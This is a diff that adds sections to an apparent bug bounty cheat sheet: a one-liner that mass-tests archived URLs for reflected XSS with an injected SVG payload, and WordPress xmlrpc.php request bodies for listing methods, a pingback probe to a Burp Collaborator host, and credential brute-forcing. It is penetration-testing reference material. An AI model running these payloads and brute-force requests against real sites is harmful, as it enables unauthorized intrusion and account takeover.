@@ -15,6 +15,9 @@
 
 
 ### BugBounty
+  - [One liner bugbounty](#one-liner-bugbounty)
+  - [CMS exploitation](#cms-exploitation)
+     - [Wordpress](#wordpress)
   - [Basic enumeration](#basic-enumeration)
      - [find subdomains](#find-subdomains)
      - [brute force >](#brute-force)
@@ -90,6 +93,50 @@
   - [SQLi+XSS+SSTI](#sqli-xss-ssti)
   - [ShellShock](#shellshock)
 -------------------------------------------------------------------------------------------------------------
+# One liner BugBounty
+
+### XSS finder
+```bash
+waybackurls test.com | tee test.com-urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><svg/onload=confirm(1)>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<svg/onload=confirm(1)>" && echo -e "$host \e[31m Vulnerable\n" || echo -e "$host \e[32m Not Vulnerable\n";done 
+```
+
+# CMS exploitation
+
+### Wordpress
+------------------------------------
+#### basic enumeration on `xmlrpc.php` file - (if enabled)
+
+`list all methods`
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+```
+`send a pingback request`
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://hash.burpcollaborator.net</string></value>
+</param><param><value><string>http://vulnerable-site.com</string>
+</value></param></params>
+</methodCall>
+```
+`username & password bruteforce`
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall> 
+<methodName>wp.getUsersBlogs</methodName> 
+<params> 
+<param><value>\{\{your username\}\}</value></param> 
+<param><value>\{\{your password\}\}</value></param> 
+</params> 
+</methodCall>
+```
+-------------------------------------
 # Basic Enumeration
 
 ### Find Subdomains
